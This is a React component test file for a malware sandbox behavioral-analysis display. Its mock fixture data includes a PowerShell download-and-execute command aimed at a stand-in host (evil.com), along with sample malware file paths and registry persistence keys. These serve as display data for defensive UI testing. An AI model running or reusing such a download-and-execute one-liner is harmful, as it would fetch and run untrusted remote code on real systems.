import React from 'react'
import { describe, it, expect, beforeEach, vi } from 'vitest'
import { render, screen, fireEvent } from '@testing-library/react'
import { BehavioralAnalysisDisplay } from '../BehavioralAnalysisDisplay'
import type { BehavioralAnalysis, SandboxBehavior } from '@/types'

// Mock utils
vi.mock('@/lib/utils', () => ({
  formatDate: vi.fn((date: string) => `Formatted: ${date}`),
}))

const mockBehavioralAnalysis: BehavioralAnalysis = {
  total_behaviors: 150,
  severity_breakdown: {
    critical: 5,
    high: 15,
    medium: 45,
    low: 70,
    info: 15,
  },
  behavior_categories: {
    process_activity: 45,
    network_activity: 30,
    file_operations: 40,
    registry_operations: 25,
    service_operations: 10,
  },
  top_processes: [
    {
      process_path: 'C:\\Windows\\System32\\powershell.exe',
      count: 25,
      command_lines: [
        'powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/script.ps1\')"',
        'powershell.exe -WindowStyle Hidden -Command "Get-Process"',
        'powershell.exe -NoProfile -Command "Write-Host \'Hello World\'"',
        'powershell.exe -EncodedCommand <base64_encoded_command>',
        'powershell.exe -Command "Start-Process notepad.exe"',
      ]
    },
    {
      process_path: 'C:\\Temp\\malware.exe',
      count: 12,
      command_lines: [
        'malware.exe -install',
        'malware.exe --silent --background'
      ]
    }
  ],
  network_connections: [
    {
      destination_ip: '192.168.1.100',
      destination_port: 443,
      protocol: 'TCP',
      count: 15,
    },
    {
      destination_ip: '10.0.0.50',
      destination_port: 80,
      protocol: 'HTTP',
      count: 8,
    }
  ],
  file_operations: [
    {
      target_file: 'C:\\Users\\Public\\malicious.exe',
      operation_type: 'CREATE',
      count: 3,
    },
    {
      target_file: 'C:\\Windows\\System32\\drivers\\malware.sys',
      operation_type: 'WRITE',
      count: 1,
    }
  ],
  registry_operations: [
    {
      registry_key: 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
      operation_type: 'SET_VALUE',
      count: 2,
    },
    {
      registry_key: 'HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MalwareService',
      operation_type: 'CREATE_KEY',
      count: 1,
    }
  ],
  behavioral_timeline: [
    {
      timestamp: '2023-01-01T12:00:00Z',
      event_type: 'process_creation',
      description: 'PowerShell process created with suspicious parameters',
      severity: 'high',
    },
    {
      timestamp: '2023-01-01T12:01:00Z',
      event_type: 'network_connection',
      description: 'Outbound connection to suspicious IP address',
      severity: 'critical',
    },
    {
      timestamp: '2023-01-01T12:02:00Z',
      event_type: 'file_operation',
      description: 'Malicious file written to system directory',
      severity: 'high',
    }
  ]
}

const mockSandboxBehaviors: SandboxBehavior[] = [
  {
    rule_id: 'SB001',
    rule_title: 'Suspicious PowerShell Execution',
    rule_author: 'Security Team',
    rule_description: 'Detects PowerShell execution with bypass parameters',
    rule_source: 'Internal Rules',
    severity: 'high',
    event_count: 5,
  },
  {
    rule_id: 'SB002',
    rule_title: 'Network Communication to Known Bad IP',
    rule_author: 'Threat Intel Team',
    rule_description: 'Identifies communication with known malicious IP addresses',
    rule_source: 'Threat Intelligence Feed',
    severity: 'critical',
    event_count: 3,
  },
  {
    rule_id: 'SB003',
    rule_title: 'Registry Persistence Mechanism',
    rule_author: 'Behavior Analysis Team',
    rule_description: 'Detects creation of registry entries for persistence',
    rule_source: 'Behavioral Rules',
    severity: 'medium',
    event_count: 2,
  }
]

describe('BehavioralAnalysisDisplay', () => {
  beforeEach(() => {
    vi.clearAllMocks()
  })

  describe('No Data State', () => {
    it('renders no data message when behavioral analysis is null', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={null as any} sandbox_behaviors={[]} />)
      
      expect(screen.getByText('No behavioral analysis data available')).toBeInTheDocument()
      expect(screen.getByText('This file may not have been analyzed for behavioral patterns')).toBeInTheDocument()
    })

    it('renders no data message when total behaviors is 0', () => {
      const emptyAnalysis = { ...mockBehavioralAnalysis, total_behaviors: 0 }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={emptyAnalysis} sandbox_behaviors={[]} />)
      
      expect(screen.getByText('No behavioral analysis data available')).toBeInTheDocument()
    })

    it('renders no data message when behavioral analysis is undefined', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={undefined as any} sandbox_behaviors={[]} />)
      
      expect(screen.getByText('No behavioral analysis data available')).toBeInTheDocument()
    })
  })

  describe('Overview Display', () => {
    it('renders behavioral analysis overview card', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText('Behavioral Analysis Overview')).toBeInTheDocument()
    })

    it('displays total behaviors count', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText('150')).toBeInTheDocument()
      expect(screen.getByText('Total Behaviors')).toBeInTheDocument()
    })

    it('calculates and displays high risk count', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      // critical (5) + high (15) = 20
      expect(screen.getByText('20')).toBeInTheDocument()
      expect(screen.getByText('High Risk')).toBeInTheDocument()
    })

    it('displays behavior category counts', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText('45')).toBeInTheDocument() // process_activity
      expect(screen.getByText('Process Activity')).toBeInTheDocument()
      expect(screen.getByText('30')).toBeInTheDocument() // network_activity
      expect(screen.getByText('Network Activity')).toBeInTheDocument()
      expect(screen.getByText('40')).toBeInTheDocument() // file_operations
      expect(screen.getByText('File Operations')).toBeInTheDocument()
    })

    it('displays severity breakdown with colors', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText('Severity Distribution')).toBeInTheDocument()
      expect(screen.getByText('Critical')).toBeInTheDocument()
      expect(screen.getByText('High')).toBeInTheDocument()
      expect(screen.getByText('Medium')).toBeInTheDocument()
      expect(screen.getByText('Low')).toBeInTheDocument()
      expect(screen.getByText('Info')).toBeInTheDocument()
      
      // Should display counts
      expect(screen.getByText('5')).toBeInTheDocument() // critical
      expect(screen.getByText('15')).toBeInTheDocument() // high
      expect(screen.getByText('45')).toBeInTheDocument() // medium
      expect(screen.getByText('70')).toBeInTheDocument() // low
    })
  })

  describe('Tabs Navigation', () => {
    it('renders all tab triggers', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText('Process Activity')).toBeInTheDocument()
      expect(screen.getByText('Network Activity')).toBeInTheDocument()
      expect(screen.getByText('File Operations')).toBeInTheDocument()
      expect(screen.getByText('Registry Operations')).toBeInTheDocument()
      expect(screen.getByText('Timeline')).toBeInTheDocument()
      expect(screen.getByText('Detection Rules')).toBeInTheDocument()
    })

    it('switches between tabs correctly', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      // Process Activity tab is default
      expect(screen.getByText('C:\\Windows\\System32\\powershell.exe')).toBeInTheDocument()
      
      // Switch to Network tab
      fireEvent.click(screen.getByRole('tab', { name: 'Network Activity' }))
      expect(screen.getByText('Network Connections')).toBeInTheDocument()
      expect(screen.getByText('192.168.1.100')).toBeInTheDocument()
      
      // Switch to Files tab
      fireEvent.click(screen.getByRole('tab', { name: 'File Operations' }))
      expect(screen.getByText('C:\\Users\\Public\\malicious.exe')).toBeInTheDocument()
    })
  })

  describe('Process Activity Tab', () => {
    it('displays process paths and event counts', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText('C:\\Windows\\System32\\powershell.exe')).toBeInTheDocument()
      expect(screen.getByText('C:\\Temp\\malware.exe')).toBeInTheDocument()
      expect(screen.getByText('25 events')).toBeInTheDocument()
      expect(screen.getByText('12 events')).toBeInTheDocument()
    })

    it('displays command lines with truncation', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText('Command Lines:')).toBeInTheDocument()
      expect(screen.getByText(/powershell.exe -ExecutionPolicy Bypass/)).toBeInTheDocument()
      expect(screen.getByText(/powershell.exe -WindowStyle Hidden/)).toBeInTheDocument()
      expect(screen.getByText(/powershell.exe -NoProfile/)).toBeInTheDocument()
      expect(screen.getByText('+2 more command lines')).toBeInTheDocument()
    })

    it('handles empty process activity', () => {
      const emptyProcessAnalysis = {
        ...mockBehavioralAnalysis,
        top_processes: []
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={emptyProcessAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText('No process activity detected')).toBeInTheDocument()
    })
  })

  describe('Network Activity Tab', () => {
    it('displays network connections with details', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Network Activity' }))
      
      expect(screen.getByText('Network Connections')).toBeInTheDocument()
      expect(screen.getByText('192.168.1.100')).toBeInTheDocument()
      expect(screen.getByText('10.0.0.50')).toBeInTheDocument()
      expect(screen.getByText('Port: 443')).toBeInTheDocument()
      expect(screen.getByText('Port: 80')).toBeInTheDocument()
      expect(screen.getByText('Protocol: TCP')).toBeInTheDocument()
      expect(screen.getByText('Protocol: HTTP')).toBeInTheDocument()
      expect(screen.getByText('15 connections')).toBeInTheDocument()
      expect(screen.getByText('8 connections')).toBeInTheDocument()
    })

    it('handles empty network activity', () => {
      const emptyNetworkAnalysis = {
        ...mockBehavioralAnalysis,
        network_connections: []
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={emptyNetworkAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Network Activity' }))
      
      expect(screen.getByText('No network activity detected')).toBeInTheDocument()
    })
  })

  describe('File Operations Tab', () => {
    it('displays file operations with details', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'File Operations' }))
      
      expect(screen.getByText('File Operations')).toBeInTheDocument()
      expect(screen.getByText('C:\\Users\\Public\\malicious.exe')).toBeInTheDocument()
      expect(screen.getByText('C:\\Windows\\System32\\drivers\\malware.sys')).toBeInTheDocument()
      expect(screen.getByText('CREATE')).toBeInTheDocument()
      expect(screen.getByText('WRITE')).toBeInTheDocument()
      expect(screen.getByText('3 operations')).toBeInTheDocument()
      expect(screen.getByText('1 operations')).toBeInTheDocument()
    })

    it('handles empty file operations', () => {
      const emptyFileAnalysis = {
        ...mockBehavioralAnalysis,
        file_operations: []
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={emptyFileAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'File Operations' }))
      
      expect(screen.getByText('No file operations detected')).toBeInTheDocument()
    })
  })

  describe('Registry Operations Tab', () => {
    it('displays registry operations with details', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Registry Operations' }))
      
      expect(screen.getByText('Registry Operations')).toBeInTheDocument()
      expect(screen.getByText('HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')).toBeInTheDocument()
      expect(screen.getByText('HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\MalwareService')).toBeInTheDocument()
      expect(screen.getByText('SET_VALUE')).toBeInTheDocument()
      expect(screen.getByText('CREATE_KEY')).toBeInTheDocument()
      expect(screen.getByText('2 operations')).toBeInTheDocument()
      expect(screen.getByText('1 operations')).toBeInTheDocument()
    })

    it('handles empty registry operations', () => {
      const emptyRegistryAnalysis = {
        ...mockBehavioralAnalysis,
        registry_operations: []
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={emptyRegistryAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Registry Operations' }))
      
      expect(screen.getByText('No registry operations detected')).toBeInTheDocument()
    })
  })

  describe('Timeline Tab', () => {
    it('displays behavioral timeline with proper formatting', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Timeline' }))
      
      expect(screen.getByText('Behavioral Timeline')).toBeInTheDocument()
      expect(screen.getByText('PowerShell process created with suspicious parameters')).toBeInTheDocument()
      expect(screen.getByText('Outbound connection to suspicious IP address')).toBeInTheDocument()
      expect(screen.getByText('Malicious file written to system directory')).toBeInTheDocument()
    })

    it('displays timeline events with severity badges', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Timeline' }))
      
      const highBadges = screen.getAllByText('high')
      const criticalBadges = screen.getAllByText('critical')
      
      expect(highBadges.length).toBe(2)
      expect(criticalBadges.length).toBe(1)
    })

    it('applies severity colors to timeline borders', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Timeline' }))
      
      const timelineItems = document.querySelectorAll('.border-l-4')
      expect(timelineItems.length).toBe(3)
      
      // Critical should have red border
      expect(timelineItems[1]).toHaveStyle('border-color: #ef4444')
      // High should have orange border
      expect(timelineItems[0]).toHaveStyle('border-color: #f97316')
    })

    it('formats timestamps using utility function', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Timeline' }))
      
      expect(screen.getByText('Formatted: 2023-01-01T12:00:00Z')).toBeInTheDocument()
      expect(screen.getByText('Formatted: 2023-01-01T12:01:00Z')).toBeInTheDocument()
    })

    it('handles empty timeline data', () => {
      const emptyTimelineAnalysis = {
        ...mockBehavioralAnalysis,
        behavioral_timeline: []
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={emptyTimelineAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Timeline' }))
      
      expect(screen.getByText('No timeline data available')).toBeInTheDocument()
    })
  })

  describe('Detection Rules Tab', () => {
    it('displays sandbox behavior rules', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Detection Rules' }))
      
      expect(screen.getByText('Detection Rules Triggered')).toBeInTheDocument()
      expect(screen.getByText('Suspicious PowerShell Execution')).toBeInTheDocument()
      expect(screen.getByText('Network Communication to Known Bad IP')).toBeInTheDocument()
      expect(screen.getByText('Registry Persistence Mechanism')).toBeInTheDocument()
    })

    it('displays rule metadata', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Detection Rules' }))
      
      expect(screen.getByText('Security Team')).toBeInTheDocument()
      expect(screen.getByText('Threat Intel Team')).toBeInTheDocument()
      expect(screen.getByText('Behavior Analysis Team')).toBeInTheDocument()
    })

    it('displays rule descriptions', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Detection Rules' }))
      
      expect(screen.getByText('Detects PowerShell execution with bypass parameters')).toBeInTheDocument()
      expect(screen.getByText('Identifies communication with known malicious IP addresses')).toBeInTheDocument()
      expect(screen.getByText('Detects creation of registry entries for persistence')).toBeInTheDocument()
    })

    it('applies correct badge variants for severity levels', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Detection Rules' }))
      
      const criticalBadge = screen.getByText('critical').closest('.badge')
      const highBadge = screen.getByText('high').closest('.badge')
      const mediumBadge = screen.getByText('medium').closest('.badge')
      
      expect(criticalBadge).toHaveClass('bg-destructive')
      expect(highBadge).toHaveClass('bg-destructive')
      expect(mediumBadge).not.toHaveClass('bg-destructive')
    })

    it('displays event counts for rules', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Detection Rules' }))
      
      expect(screen.getByText('5 events')).toBeInTheDocument()
      expect(screen.getByText('3 events')).toBeInTheDocument()
      expect(screen.getByText('2 events')).toBeInTheDocument()
    })

    it('displays rule sources', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Detection Rules' }))
      
      expect(screen.getByText('Source: Internal Rules')).toBeInTheDocument()
      expect(screen.getByText('Source: Threat Intelligence Feed')).toBeInTheDocument()
      expect(screen.getByText('Source: Behavioral Rules')).toBeInTheDocument()
    })

    it('handles empty sandbox behaviors', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={[]} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Detection Rules' }))
      
      expect(screen.getByText('No detection rules triggered')).toBeInTheDocument()
    })

    it('handles rules without optional fields', () => {
      const minimalRules: SandboxBehavior[] = [{
        rule_id: 'MIN001',
        severity: 'low',
      }]
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={minimalRules} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Detection Rules' }))
      
      expect(screen.getByText('MIN001')).toBeInTheDocument() // Should use rule_id when title is missing
      expect(screen.queryByText('Source:')).not.toBeInTheDocument()
    })
  })

  describe('Responsive Design', () => {
    it('uses responsive grid layouts', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      const gridElements = document.querySelectorAll('.md\\:grid-cols-5, .md\\:grid-cols-2')
      expect(gridElements.length).toBeGreaterThan(0)
    })

    it('handles tab overflow on mobile', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      const tabsList = document.querySelector('.overflow-x-auto')
      expect(tabsList).toBeInTheDocument()
      
      const tabTriggers = document.querySelectorAll('.whitespace-nowrap')
      expect(tabTriggers.length).toBe(6) // All tab triggers should prevent wrapping
    })
  })

  describe('Long Text Handling', () => {
    it('handles very long process paths', () => {
      const longPathAnalysis = {
        ...mockBehavioralAnalysis,
        top_processes: [
          {
            process_path: 'C:\\Very\\Long\\Path\\That\\Might\\Cause\\Layout\\Issues\\In\\The\\User\\Interface\\Components\\malware.exe',
            count: 5,
            command_lines: []
          }
        ]
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={longPathAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText(/C:\\Very\\Long\\Path/)).toBeInTheDocument()
      
      // Should have break-all class for long paths
      const longPathElement = screen.getByText(/C:\\Very\\Long\\Path/)
      expect(longPathElement).toHaveClass('break-all')
    })

    it('handles very long command lines', () => {
      const longCommandAnalysis = {
        ...mockBehavioralAnalysis,
        top_processes: [
          {
            process_path: 'C:\\test.exe',
            count: 1,
            command_lines: [
              'powershell.exe -Command "' + 'A'.repeat(500) + '"' // Very long command
            ]
          }
        ]
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={longCommandAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      const commandElement = screen.getByText(/powershell.exe -Command/)
      expect(commandElement).toHaveClass('break-all')
    })

    it('handles very long registry keys', () => {
      const longRegistryAnalysis = {
        ...mockBehavioralAnalysis,
        registry_operations: [
          {
            registry_key: 'HKEY_LOCAL_MACHINE\\Software\\' + 'VeryLongKeyName\\'.repeat(20) + 'FinalKey',
            operation_type: 'READ',
            count: 1,
          }
        ]
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={longRegistryAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Registry Operations' }))
      
      const registryElement = screen.getByText(/HKEY_LOCAL_MACHINE\\Software/)
      expect(registryElement).toHaveClass('break-all')
    })
  })

  describe('Performance with Large Data Sets', () => {
    it('handles large behavioral timeline efficiently', () => {
      const largeTimelineAnalysis = {
        ...mockBehavioralAnalysis,
        behavioral_timeline: Array.from({ length: 1000 }, (_, i) => ({
          timestamp: `2023-01-01T12:${i.toString().padStart(2, '0')}:00Z`,
          event_type: 'test_event',
          description: `Test event ${i}`,
          severity: i % 4 === 0 ? 'critical' : i % 4 === 1 ? 'high' : i % 4 === 2 ? 'medium' : 'low',
        }))
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={largeTimelineAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Timeline' }))
      
      expect(screen.getByText('Test event 0')).toBeInTheDocument()
      expect(screen.getByText('Test event 999')).toBeInTheDocument()
      
      // Should use ScrollArea for performance
      const scrollArea = document.querySelector('.h-96')
      expect(scrollArea).toBeInTheDocument()
    })

    it('handles many sandbox behaviors efficiently', () => {
      const manyBehaviors = Array.from({ length: 100 }, (_, i) => ({
        rule_id: `RULE${i}`,
        rule_title: `Test Rule ${i}`,
        rule_author: `Author ${i}`,
        severity: i % 4 === 0 ? 'critical' : i % 4 === 1 ? 'high' : i % 4 === 2 ? 'medium' : 'low',
        event_count: Math.floor(Math.random() * 10) + 1,
      }))
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={manyBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Detection Rules' }))
      
      expect(screen.getByText('Test Rule 0')).toBeInTheDocument()
      expect(screen.getByText('Test Rule 99')).toBeInTheDocument()
    })
  })

  describe('Accessibility', () => {
    it('provides proper heading structure', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      const mainHeading = screen.getByRole('heading', { name: /Behavioral Analysis Overview/ })
      expect(mainHeading).toBeInTheDocument()
    })

    it('provides proper tab navigation', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      const tabs = screen.getAllByRole('tab')
      expect(tabs.length).toBe(6)
      
      tabs.forEach(tab => {
        expect(tab).toHaveAttribute('aria-selected')
      })
    })

    it('provides meaningful labels for data sections', () => {
      render(<BehavioralAnalysisDisplay behavioral_analysis={mockBehavioralAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText('Total Behaviors')).toBeInTheDocument()
      expect(screen.getByText('High Risk')).toBeInTheDocument()
      expect(screen.getByText('Severity Distribution')).toBeInTheDocument()
    })
  })

  describe('Data Edge Cases', () => {
    it('handles missing severity breakdown', () => {
      const incompleteAnalysis = {
        ...mockBehavioralAnalysis,
        severity_breakdown: {}
      } as any
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={incompleteAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText('Behavioral Analysis Overview')).toBeInTheDocument()
      // Should handle missing severity data gracefully
    })

    it('handles missing behavior categories', () => {
      const incompleteCategoriesAnalysis = {
        ...mockBehavioralAnalysis,
        behavior_categories: {}
      } as any
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={incompleteCategoriesAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      expect(screen.getByText('Behavioral Analysis Overview')).toBeInTheDocument()
      // Should handle missing category data gracefully
    })

    it('handles null timeline events', () => {
      const nullTimelineAnalysis = {
        ...mockBehavioralAnalysis,
        behavioral_timeline: [null, undefined] as any
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={nullTimelineAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      fireEvent.click(screen.getByRole('tab', { name: 'Timeline' }))
      
      // Should not crash with null timeline events
      expect(screen.getByText('Behavioral Timeline')).toBeInTheDocument()
    })

    it('handles malformed process data', () => {
      const malformedProcessAnalysis = {
        ...mockBehavioralAnalysis,
        top_processes: [
          {
            process_path: null,
            count: 'not-a-number',
            command_lines: null
          }
        ] as any
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={malformedProcessAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      // Should handle malformed data without crashing
      expect(screen.getByText('Process Activity')).toBeInTheDocument()
    })
  })

  describe('Visual Indicators', () => {
    it('applies correct opacity for zero-count severity items', () => {
      const zeroSeverityAnalysis = {
        ...mockBehavioralAnalysis,
        severity_breakdown: {
          critical: 0,
          high: 0,
          medium: 5,
          low: 10,
          info: 0,
        }
      }
      
      render(<BehavioralAnalysisDisplay behavioral_analysis={zeroSeverityAnalysis} sandbox_behaviors={mockSandboxBehaviors} />)
      
      const severityBars = document.querySelectorAll('.h-2.rounded-full')
      
      // Zero count items should have low opacity
      const criticalBar = severityBars[0]
      const highBar = severityBars[1]
      const mediumBar = severityBars[2]
      
      expect(criticalBar).toHaveStyle('opacity: 0.2')
      expect(highBar).toHaveStyle('opacity: 0.2')
      expect(mediumBar).toHaveStyle('opacity: 1')
    })
  })
})